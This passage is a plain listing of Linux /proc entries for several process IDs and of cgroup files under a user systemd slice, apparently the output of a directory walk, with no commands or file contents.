/proc/1025/fd/21
/proc/1025/fd/22
/proc/1025/fd/23
/proc/1025/fd/28
/proc/1025/fd/29
/proc/1025/fd/30
/proc/1025/fd/31
/proc/1025/fd/32
/proc/1025/fd/35
/proc/1025/fd/36
/proc/1025/fd/37
/proc/1025/fd/38
/proc/1025/map_files
/proc/1025/fdinfo
/proc/1025/ns
/proc/1025/ns/net
/proc/1025/ns/uts
/proc/1025/ns/ipc
/proc/1025/ns/pid
/proc/1025/ns/pid_for_children
/proc/1025/ns/user
/proc/1025/ns/mnt
/proc/1025/ns/cgroup
/proc/1025/ns/time
/proc/1025/ns/time_for_children
/proc/1025/net
/proc/1025/environ
/proc/1025/auxv
/proc/1025/status
/proc/1025/personality
/proc/1025/limits
/proc/1025/sched
/proc/1025/autogroup
/proc/1025/timens_offsets
/proc/1025/comm
/proc/1025/syscall
/proc/1025/cmdline
/proc/1025/stat
/proc/1025/statm
/proc/1025/maps
/proc/1025/numa_maps
/proc/1025/mem
/proc/1025/cwd
/proc/1025/root
/proc/1025/exe
/proc/1025/mounts
/proc/1025/mountinfo
/proc/1025/mountstats
/proc/1025/clear_refs
/proc/1025/smaps
/proc/1025/smaps_rollup
/proc/1025/pagemap
/proc/1025/attr
/proc/1025/attr/current
/proc/1025/attr/prev
/proc/1025/attr/exec
/proc/1025/attr/fscreate
/proc/1025/attr/keycreate
/proc/1025/attr/sockcreate
/proc/1025/attr/smack
/proc/1025/attr/smack/current
/proc/1025/attr/apparmor
/proc/1025/attr/apparmor/current
/proc/1025/attr/apparmor/prev
/proc/1025/attr/apparmor/exec
/proc/1025/wchan
/proc/1025/stack
/proc/1025/schedstat
/proc/1025/latency
/proc/1025/cpuset
/proc/1025/cgroup
/proc/1025/cpu_resctrl_groups
/proc/1025/oom_score
/proc/1025/oom_adj
/proc/1025/oom_score_adj
/proc/1025/loginuid
/proc/1025/sessionid
/proc/1025/coredump_filter
/proc/1025/io
/proc/1025/uid_map
/proc/1025/gid_map
/proc/1025/projid_map
/proc/1025/setgroups
/proc/1025/timers
/proc/1025/timerslack_ns
/proc/1025/patch_state
/proc/1025/arch_status
/proc/1025/ksm_merging_pages
/proc/1025/ksm_stat
/proc/1026
/proc/1026/task
/proc/1026/task/1026
/proc/1026/task/1026/fdinfo
/proc/1026/task/1026/net
/proc/1026/task/1026/attr
/proc/1026/task/1026/attr/smack
/proc/1026/task/1026/attr/apparmor
/proc/1026/fdinfo
/proc/1026/net
/proc/1026/attr
/proc/1026/attr/smack
/proc/1026/attr/apparmor
/proc/1038
/proc/1038/task
/proc/1038/task/1038
/proc/1038/task/1038/fd
/proc/1038/task/1038/fd/0
/proc/1038/task/1038/fd/1
/proc/1038/task/1038/fd/2
/proc/1038/task/1038/fd/255
/proc/1038/task/1038/fdinfo
/proc/1038/task/1038/fdinfo/0
/proc/1038/task/1038/fdinfo/1
/proc/1038/task/1038/fdinfo/2
/proc/1038/task/1038/fdinfo/255
/proc/1038/task/1038/ns
/proc/1038/task/1038/ns/net
/proc/1038/task/1038/ns/uts
/proc/1038/task/1038/ns/ipc
/proc/1038/task/1038/ns/pid
/proc/1038/task/1038/ns/pid_for_children
/proc/1038/task/1038/ns/user
/proc/1038/task/1038/ns/mnt
/proc/1038/task/1038/ns/cgroup
/proc/1038/task/1038/ns/time
/proc/1038/task/1038/ns/time_for_children
/proc/1038/task/1038/net
/proc/1038/task/1038/environ
/proc/1038/task/1038/auxv
/proc/1038/task/1038/status
/proc/1038/task/1038/personality
/proc/1038/task/1038/limits
/proc/1038/task/1038/sched
/proc/1038/task/1038/comm
/proc/1038/task/1038/syscall
/proc/1038/task/1038/cmdline
/proc/1038/task/1038/stat
/proc/1038/task/1038/statm
/proc/1038/task/1038/maps
/proc/1038/task/1038/children
/proc/1038/task/1038/numa_maps
/proc/1038/task/1038/mem
/proc/1038/task/1038/cwd
/proc/1038/task/1038/root
/proc/1038/task/1038/exe
/proc/1038/task/1038/mounts
/proc/1038/task/1038/mountinfo
/proc/1038/task/1038/clear_refs
/proc/1038/task/1038/smaps
/proc/1038/task/1038/smaps_rollup
/proc/1038/task/1038/pagemap
/proc/1038/task/1038/attr
/proc/1038/task/1038/attr/current
/proc/1038/task/1038/attr/prev
/proc/1038/task/1038/attr/exec
/proc/1038/task/1038/attr/fscreate
/proc/1038/task/1038/attr/keycreate
/proc/1038/task/1038/attr/sockcreate
/proc/1038/task/1038/attr/smack
/proc/1038/task/1038/attr/smack/current
/proc/1038/task/1038/attr/apparmor
/proc/1038/task/1038/attr/apparmor/current
/proc/1038/task/1038/attr/apparmor/prev
/proc/1038/task/1038/attr/apparmor/exec
/proc/1038/task/1038/wchan
/proc/1038/task/1038/stack
/proc/1038/task/1038/schedstat
/proc/1038/task/1038/latency
/proc/1038/task/1038/cpuset
/proc/1038/task/1038/cgroup
/proc/1038/task/1038/cpu_resctrl_groups
/proc/1038/task/1038/oom_score
/proc/1038/task/1038/oom_adj
/proc/1038/task/1038/oom_score_adj
/proc/1038/task/1038/loginuid
/proc/1038/task/1038/sessionid
/proc/1038/task/1038/io
/proc/1038/task/1038/uid_map
/proc/1038/task/1038/gid_map
/proc/1038/task/1038/projid_map
/proc/1038/task/1038/setgroups
/proc/1038/task/1038/patch_state
/proc/1038/task/1038/arch_status
/proc/1038/task/1038/ksm_merging_pages
/proc/1038/task/1038/ksm_stat
/proc/1038/fd
/proc/1038/fd/0
/proc/1038/fd/1
/proc/1038/fd/2
/proc/1038/fd/255
/proc/1038/map_files
/proc/1038/map_files/61fe8f869000-61fe8f899000
/proc/1038/map_files/61fe8f899000-61fe8f988000
/proc/1038/map_files/61fe8f988000-61fe8f9bd000
/proc/1038/map_files/61fe8f9bd000-61fe8f9c1000
/proc/1038/map_files/61fe8f9c1000-61fe8f9ca000
/proc/1038/map_files/7da98d200000-7da98d4eb000
/proc/1038/map_files/7da98d600000-7da98d628000
/proc/1038/map_files/7da98d628000-7da98d7b0000
/proc/1038/map_files/7da98d7b0000-7da98d7ff000
/proc/1038/map_files/7da98d7ff000-7da98d803000
/proc/1038/map_files/7da98d803000-7da98d805000
/proc/1038/map_files/7da98d9d2000-7da98d9d9000
/proc/1038/map_files/7da98d9dc000-7da98d9ea000
/proc/1038/map_files/7da98d9ea000-7da98d9fd000
/proc/1038/map_files/7da98d9fd000-7da98da0b000
/proc/1038/map_files/7da98da0b000-7da98da0f000
/proc/1038/map_files/7da98da0f000-7da98da10000
/proc/1038/map_files/7da98da18000-7da98da19000
/proc/1038/map_files/7da98da19000-7da98da44000
/proc/1038/map_files/7da98da44000-7da98da4e000
/proc/1038/map_files/7da98da4e000-7da98da50000
/proc/1038/map_files/7da98da50000-7da98da52000
/proc/1038/fdinfo
/proc/1038/fdinfo/0
/proc/1038/fdinfo/1
/proc/1038/fdinfo/2
/proc/1038/fdinfo/255
/proc/1038/ns
/proc/1038/ns/net
/proc/1038/ns/uts
/proc/1038/ns/ipc
/proc/1038/ns/pid
/proc/1038/ns/pid_for_children
/proc/1038/ns/user
/proc/1038/ns/mnt
/proc/1038/ns/cgroup
/proc/1038/ns/time
/proc/1038/ns/time_for_children
/proc/1038/net
/proc/1038/environ
/proc/1038/auxv
/proc/1038/status
/proc/1038/personality
/proc/1038/limits
/proc/1038/sched
/proc/1038/autogroup
/proc/1038/timens_offsets
/proc/1038/comm
/proc/1038/syscall
/proc/1038/cmdline
/proc/1038/stat
/proc/1038/statm
/proc/1038/maps
/proc/1038/numa_maps
/proc/1038/mem
/proc/1038/cwd
/proc/1038/root
/proc/1038/exe
/proc/1038/mounts
/proc/1038/mountinfo
/proc/1038/mountstats
/proc/1038/clear_refs
/proc/1038/smaps
/proc/1038/smaps_rollup
/proc/1038/pagemap
/proc/1038/attr
/proc/1038/attr/current
/proc/1038/attr/prev
/proc/1038/attr/exec
/proc/1038/attr/fscreate
/proc/1038/attr/keycreate
/proc/1038/attr/sockcreate
/proc/1038/attr/smack
/proc/1038/attr/smack/current
/proc/1038/attr/apparmor
/proc/1038/attr/apparmor/current
/proc/1038/attr/apparmor/prev
/proc/1038/attr/apparmor/exec
/proc/1038/wchan
/proc/1038/stack
/proc/1038/schedstat
/proc/1038/latency
/proc/1038/cpuset
/proc/1038/cgroup
/proc/1038/cpu_resctrl_groups
/proc/1038/oom_score
/proc/1038/oom_adj
/proc/1038/oom_score_adj
/proc/1038/loginuid
/proc/1038/sessionid
/proc/1038/coredump_filter
/proc/1038/io
/proc/1038/uid_map
/proc/1038/gid_map
/proc/1038/projid_map
/proc/1038/setgroups
/proc/1038/timers
/proc/1038/timerslack_ns
/proc/1038/patch_state
/proc/1038/arch_status
/proc/1038/ksm_merging_pages
/proc/1038/ksm_stat
/proc/4245
/proc/4245/task
/proc/4245/task/4245
/proc/4245/task/4245/fdinfo
/proc/4245/task/4245/net
/proc/4245/task/4245/attr
/proc/4245/task/4245/attr/smack
/proc/4245/task/4245/attr/apparmor
/proc/4245/fdinfo
/proc/4245/net
/proc/4245/attr
/proc/4245/attr/smack
/proc/4245/attr/apparmor
/proc/4246
/proc/4246/task
/proc/4246/task/4246
/proc/4246/task/4246/fd
/proc/4246/task/4246/fd/0
/proc/4246/task/4246/fd/1
/proc/4246/task/4246/fd/2
/proc/4246/task/4246/fd/255
/proc/4246/task/4246/fdinfo
/proc/4246/task/4246/fdinfo/0
/proc/4246/task/4246/fdinfo/1
/proc/4246/task/4246/fdinfo/2
/proc/4246/task/4246/fdinfo/255
/proc/4246/task/4246/ns
/proc/4246/task/4246/ns/net
/proc/4246/task/4246/ns/uts
/proc/4246/task/4246/ns/ipc
/proc/4246/task/4246/ns/pid
/proc/4246/task/4246/ns/pid_for_children
/proc/4246/task/4246/ns/user
/proc/4246/task/4246/ns/mnt
/proc/4246/task/4246/ns/cgroup
/proc/4246/task/4246/ns/time
/proc/4246/task/4246/ns/time_for_children
/proc/4246/task/4246/net
/proc/4246/task/4246/environ
/proc/4246/task/4246/auxv
/proc/4246/task/4246/status
/proc/4246/task/4246/personality
/proc/4246/task/4246/limits
/proc/4246/task/4246/sched
/proc/4246/task/4246/comm
/proc/4246/task/4246/syscall
/proc/4246/task/4246/cmdline
/proc/4246/task/4246/stat
/proc/4246/task/4246/statm
/proc/4246/task/4246/maps
/proc/4246/task/4246/children
/proc/4246/task/4246/numa_maps
/proc/4246/task/4246/mem
/proc/4246/task/4246/cwd
/proc/4246/task/4246/root
/proc/4246/task/4246/exe
/proc/4246/task/4246/mounts
/proc/4246/task/4246/mountinfo
/proc/4246/task/4246/clear_refs
/proc/4246/task/4246/smaps
/proc/4246/task/4246/smaps_rollup
/proc/4246/task/4246/pagemap
/proc/4246/task/4246/attr
/proc/4246/task/4246/attr/current
/proc/4246/task/4246/attr/prev
/proc/4246/task/4246/attr/exec
/proc/4246/task/4246/attr/fscreate
/proc/4246/task/4246/attr/keycreate
/proc/4246/task/4246/attr/sockcreate
/proc/4246/task/4246/attr/smack
/proc/4246/task/4246/attr/smack/current
/proc/4246/task/4246/attr/apparmor
/proc/4246/task/4246/attr/apparmor/current
/proc/4246/task/4246/attr/apparmor/prev
/proc/4246/task/4246/attr/apparmor/exec
/proc/4246/task/4246/wchan
/proc/4246/task/4246/stack
/proc/4246/task/4246/schedstat
/proc/4246/task/4246/latency
/proc/4246/task/4246/cpuset
/proc/4246/task/4246/cgroup
/proc/4246/task/4246/cpu_resctrl_groups
/proc/4246/task/4246/oom_score
/proc/4246/task/4246/oom_adj
/proc/4246/task/4246/oom_score_adj
/proc/4246/task/4246/loginuid
/proc/4246/task/4246/sessionid
/proc/4246/task/4246/io
/proc/4246/task/4246/uid_map
/proc/4246/task/4246/gid_map
/proc/4246/task/4246/projid_map
/proc/4246/task/4246/setgroups
/proc/4246/task/4246/patch_state
/proc/4246/task/4246/arch_status
/proc/4246/task/4246/ksm_merging_pages
/proc/4246/task/4246/ksm_stat
/proc/4246/fd
/proc/4246/fd/0
/proc/4246/fd/1
/proc/4246/fd/2
/proc/4246/fd/255
/proc/4246/map_files
/proc/4246/map_files/633317c7d000-633317cad000
/proc/4246/map_files/633317cad000-633317d9c000
/proc/4246/map_files/633317d9c000-633317dd1000
/proc/4246/map_files/633317dd1000-633317dd5000
/proc/4246/map_files/633317dd5000-633317dde000
/proc/4246/map_files/7e9509000000-7e95092eb000
/proc/4246/map_files/7e9509400000-7e9509428000
/proc/4246/map_files/7e9509428000-7e95095b0000
/proc/4246/map_files/7e95095b0000-7e95095ff000
/proc/4246/map_files/7e95095ff000-7e9509603000
/proc/4246/map_files/7e9509603000-7e9509605000
/proc/4246/map_files/7e95097d5000-7e95097dc000
/proc/4246/map_files/7e95097df000-7e95097ed000
/proc/4246/map_files/7e95097ed000-7e9509800000
/proc/4246/map_files/7e9509800000-7e950980e000
/proc/4246/map_files/7e950980e000-7e9509812000
/proc/4246/map_files/7e9509812000-7e9509813000
/proc/4246/map_files/7e950981b000-7e950981c000
/proc/4246/map_files/7e950981c000-7e9509847000
/proc/4246/map_files/7e9509847000-7e9509851000
/proc/4246/map_files/7e9509851000-7e9509853000
/proc/4246/map_files/7e9509853000-7e9509855000
/proc/4246/fdinfo
/proc/4246/fdinfo/0
/proc/4246/fdinfo/1
/proc/4246/fdinfo/2
/proc/4246/fdinfo/255
/proc/4246/ns
/proc/4246/ns/net
/proc/4246/ns/uts
/proc/4246/ns/ipc
/proc/4246/ns/pid
/proc/4246/ns/pid_for_children
/proc/4246/ns/user
/proc/4246/ns/mnt
/proc/4246/ns/cgroup
/proc/4246/ns/time
/proc/4246/ns/time_for_children
/proc/4246/net
/proc/4246/environ
/proc/4246/auxv
/proc/4246/status
/proc/4246/personality
/proc/4246/limits
/proc/4246/sched
/proc/4246/autogroup
/proc/4246/timens_offsets
/proc/4246/comm
/proc/4246/syscall
/proc/4246/cmdline
/proc/4246/stat
/proc/4246/statm
/proc/4246/maps
/proc/4246/numa_maps
/proc/4246/mem
/proc/4246/cwd
/proc/4246/root
/proc/4246/exe
/proc/4246/mounts
/proc/4246/mountinfo
/proc/4246/mountstats
/proc/4246/clear_refs
/proc/4246/smaps
/proc/4246/smaps_rollup
/proc/4246/pagemap
/proc/4246/attr
/proc/4246/attr/current
/proc/4246/attr/prev
/proc/4246/attr/exec
/proc/4246/attr/fscreate
/proc/4246/attr/keycreate
/proc/4246/attr/sockcreate
/proc/4246/attr/smack
/proc/4246/attr/smack/current
/proc/4246/attr/apparmor
/proc/4246/attr/apparmor/current
/proc/4246/attr/apparmor/prev
/proc/4246/attr/apparmor/exec
/proc/4246/wchan
/proc/4246/stack
/proc/4246/schedstat
/proc/4246/latency
/proc/4246/cpuset
/proc/4246/cgroup
/proc/4246/cpu_resctrl_groups
/proc/4246/oom_score
/proc/4246/oom_adj
/proc/4246/oom_score_adj
/proc/4246/loginuid
/proc/4246/sessionid
/proc/4246/coredump_filter
/proc/4246/io
/proc/4246/uid_map
/proc/4246/gid_map
/proc/4246/projid_map
/proc/4246/setgroups
/proc/4246/timers
/proc/4246/timerslack_ns
/proc/4246/patch_state
/proc/4246/arch_status
/proc/4246/ksm_merging_pages
/proc/4246/ksm_stat
/proc/4838
/proc/4838/task
/proc/4838/task/4838
/proc/4838/task/4838/fd
/proc/4838/task/4838/fd/0
/proc/4838/task/4838/fd/1
/proc/4838/task/4838/fd/2
/proc/4838/task/4838/fd/3
/proc/4838/task/4838/fd/4
/proc/4838/task/4838/fd/5
/proc/4838/task/4838/fd/7
/proc/4838/task/4838/fd/8
/proc/4838/task/4838/fd/9
/proc/4838/task/4838/fd/10
/proc/4838/task/4838/fdinfo
/proc/4838/task/4838/fdinfo/0
/proc/4838/task/4838/fdinfo/1
/proc/4838/task/4838/fdinfo/2
/proc/4838/task/4838/fdinfo/3
/proc/4838/task/4838/fdinfo/4
/proc/4838/task/4838/fdinfo/5
/proc/4838/task/4838/fdinfo/7
/proc/4838/task/4838/fdinfo/8
/proc/4838/task/4838/fdinfo/9
/proc/4838/task/4838/fdinfo/10
/proc/4838/task/4838/ns
/proc/4838/task/4838/ns/net
/proc/4838/task/4838/ns/uts
/proc/4838/task/4838/ns/ipc
/proc/4838/task/4838/ns/pid
/proc/4838/task/4838/ns/pid_for_children
/proc/4838/task/4838/ns/user
/proc/4838/task/4838/ns/mnt
/proc/4838/task/4838/ns/cgroup
/proc/4838/task/4838/ns/time
/proc/4838/task/4838/ns/time_for_children
/proc/4838/task/4838/net
/proc/4838/task/4838/environ
/proc/4838/task/4838/auxv
/proc/4838/task/4838/status
/proc/4838/task/4838/personality
/proc/4838/task/4838/limits
/proc/4838/task/4838/sched
/proc/4838/task/4838/comm
/proc/4838/task/4838/syscall
/proc/4838/task/4838/cmdline
/proc/4838/task/4838/stat
/proc/4838/task/4838/statm
/proc/4838/task/4838/maps
/proc/4838/task/4838/children
/proc/4838/task/4838/numa_maps
/proc/4838/task/4838/mem
/proc/4838/task/4838/cwd
/proc/4838/task/4838/root
/proc/4838/task/4838/exe
/proc/4838/task/4838/mounts
/proc/4838/task/4838/mountinfo
/proc/4838/task/4838/clear_refs
/proc/4838/task/4838/smaps
/proc/4838/task/4838/smaps_rollup
/proc/4838/task/4838/pagemap
/proc/4838/task/4838/attr
/proc/4838/task/4838/attr/current
/proc/4838/task/4838/attr/prev
/proc/4838/task/4838/attr/exec
/proc/4838/task/4838/attr/fscreate
/proc/4838/task/4838/attr/keycreate
/proc/4838/task/4838/attr/sockcreate
/proc/4838/task/4838/attr/smack
/proc/4838/task/4838/attr/smack/current
/proc/4838/task/4838/attr/apparmor
/proc/4838/task/4838/attr/apparmor/current
/proc/4838/task/4838/attr/apparmor/prev
/proc/4838/task/4838/attr/apparmor/exec
/proc/4838/task/4838/wchan
/proc/4838/task/4838/stack
/proc/4838/task/4838/schedstat
/proc/4838/task/4838/latency
/proc/4838/task/4838/cpuset
/proc/4838/task/4838/cgroup
/proc/4838/task/4838/cpu_resctrl_groups
/proc/4838/task/4838/oom_score
/proc/4838/task/4838/oom_adj
/proc/4838/task/4838/oom_score_adj
/proc/4838/task/4838/loginuid
/proc/4838/task/4838/sessionid
/proc/4838/task/4838/io
/proc/4838/task/4838/uid_map
/proc/4838/task/4838/gid_map
/proc/4838/task/4838/projid_map
/proc/4838/task/4838/setgroups
/proc/4838/task/4838/patch_state
/proc/4838/task/4838/arch_status
/proc/4838/task/4838/ksm_merging_pages
/proc/4838/task/4838/ksm_stat
/proc/4838/fd
/proc/4838/fd/0
/proc/4838/fd/1
/proc/4838/fd/2
/proc/4838/fd/3
/proc/4838/fd/4
/proc/4838/fd/6
/proc/4838/fd/7
/proc/4838/map_files
/proc/4838/map_files/621af5e3d000-621af5e43000
/proc/4838/map_files/621af5e43000-621af5e62000
/proc/4838/map_files/621af5e62000-621af5e6c000
/proc/4838/map_files/621af5e6c000-621af5e6e000
/proc/4838/map_files/621af5e6e000-621af5e6f000
/proc/4838/map_files/769f34200000-769f344eb000
/proc/4838/map_files/769f34566000-769f34568000
/proc/4838/map_files/769f34568000-769f345d6000
/proc/4838/map_files/769f345d6000-769f345fe000
/proc/4838/map_files/769f345fe000-769f345ff000
/proc/4838/map_files/769f345ff000-769f34600000
/proc/4838/map_files/769f34600000-769f34628000
/proc/4838/map_files/769f34628000-769f347b0000
/proc/4838/map_files/769f347b0000-769f347ff000
/proc/4838/map_files/769f347ff000-769f34803000
/proc/4838/map_files/769f34803000-769f34805000
/proc/4838/map_files/769f34897000-769f3489e000
/proc/4838/map_files/769f348a1000-769f348a7000
/proc/4838/map_files/769f348a7000-769f348c4000
/proc/4838/map_files/769f348c4000-769f348ca000
/proc/4838/map_files/769f348ca000-769f348cb000
/proc/4838/map_files/769f348cb000-769f348cc000
/proc/4838/map_files/769f348d6000-769f348d7000
/proc/4838/map_files/769f348d7000-769f34902000
/proc/4838/map_files/769f34902000-769f3490c000
/proc/4838/map_files/769f3490c000-769f3490e000
/proc/4838/map_files/769f3490e000-769f34910000
/proc/4838/fdinfo
/proc/4838/fdinfo/0
/proc/4838/fdinfo/1
/proc/4838/fdinfo/2
/proc/4838/fdinfo/3
/proc/4838/fdinfo/4
/proc/4838/fdinfo/6
/proc/4838/fdinfo/7
/proc/4838/ns
/proc/4838/ns/net
/proc/4838/ns/uts
/proc/4838/ns/ipc
/proc/4838/ns/pid
/proc/4838/ns/pid_for_children
/proc/4838/ns/user
/proc/4838/ns/mnt
/proc/4838/ns/cgroup
/proc/4838/ns/time
/proc/4838/ns/time_for_children
/proc/4838/net
/proc/4838/environ
/proc/4838/auxv
/proc/4838/status
/proc/4838/personality
/proc/4838/limits
/proc/4838/sched
/proc/4838/autogroup
/proc/4838/timens_offsets
/proc/4838/comm
/proc/4838/syscall
/proc/4838/cmdline
/proc/4838/stat
/proc/4838/statm
/proc/4838/maps
/proc/4838/numa_maps
/proc/4838/mem
/proc/4838/cwd
/proc/4838/root
/proc/4838/exe
/proc/4838/mounts
/proc/4838/mountinfo
/proc/4838/mountstats
/proc/4838/clear_refs
/proc/4838/smaps
/proc/4838/smaps_rollup
/proc/4838/pagemap
/proc/4838/attr
/proc/4838/attr/current
/proc/4838/attr/prev
/proc/4838/attr/exec
/proc/4838/attr/fscreate
/proc/4838/attr/keycreate
/proc/4838/attr/sockcreate
/proc/4838/attr/smack
/proc/4838/attr/smack/current
/proc/4838/attr/apparmor
/proc/4838/attr/apparmor/current
/proc/4838/attr/apparmor/prev
/proc/4838/attr/apparmor/exec
/proc/4838/wchan
/proc/4838/stack
/proc/4838/schedstat
/proc/4838/latency
/proc/4838/cpuset
/proc/4838/cgroup
/proc/4838/cpu_resctrl_groups
/proc/4838/oom_score
/proc/4838/oom_adj
/proc/4838/oom_score_adj
/proc/4838/loginuid
/proc/4838/sessionid
/proc/4838/coredump_filter
/proc/4838/io
/proc/4838/uid_map
/proc/4838/gid_map
/proc/4838/projid_map
/proc/4838/setgroups
/proc/4838/timers
/proc/4838/timerslack_ns
/proc/4838/patch_state
/proc/4838/arch_status
/proc/4838/ksm_merging_pages
/proc/4838/ksm_stat
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/cgroup.procs
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/cgroup.threads
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/cgroup.events
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/memory.events
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/io.pressure
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/cgroup.procs
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/memory.events.local
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/memory.swap.peak
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/memory.swap.current
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/memory.swap.max
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/memory.zswap.current
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/cpu.weight
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/memory.swap.events
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/cgroup.max.descendants
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/cpu.stat
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/cpu.weight.nice
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/memory.pressure
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/memory.current
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/pids.current
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/memory.stat
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/pids.events
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/memory.low
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/cpu.pressure
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/cgroup.type
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/cgroup.stat
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/memory.swap.high
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/cpu.idle
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/cpu.stat.local
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/cgroup.events
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/memory.events
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/io.pressure
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/cgroup.procs
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/memory.events.local
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/memory.swap.peak
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/memory.swap.current
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/memory.swap.max
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/memory.zswap.current
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/memory.swap.events
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/cgroup.max.descendants
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/cpu.stat
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/memory.pressure
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/memory.current
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/pids.current
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/memory.stat
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/pids.events
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/memory.low
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/cpu.pressure
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/cgroup.type
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/cgroup.stat
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/memory.swap.high
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/cpu.stat.local
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/cgroup.threads
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/memory.numa_stat
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/cgroup.kill
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/memory.peak
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/cgroup.freeze
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/memory.min
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/cgroup.controllers
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/memory.oom.group
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/memory.zswap.writeback
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/memory.max
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/memory.high
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/pids.max
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/memory.zswap.max
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/cgroup.subtree_control
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/memory.reclaim
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/pids.peak
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/cgroup.max.depth
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/dbus.socket/cgroup.pressure
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/cgroup.threads
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/memory.numa_stat
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/cgroup.kill
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/cgroup.events
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/memory.events
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/io.pressure
/sys/fs/cgroup/user.slice/user-1001.slice/user@1001.service/app.slice/gpg-agent-ssh.socket/cgroup.procs
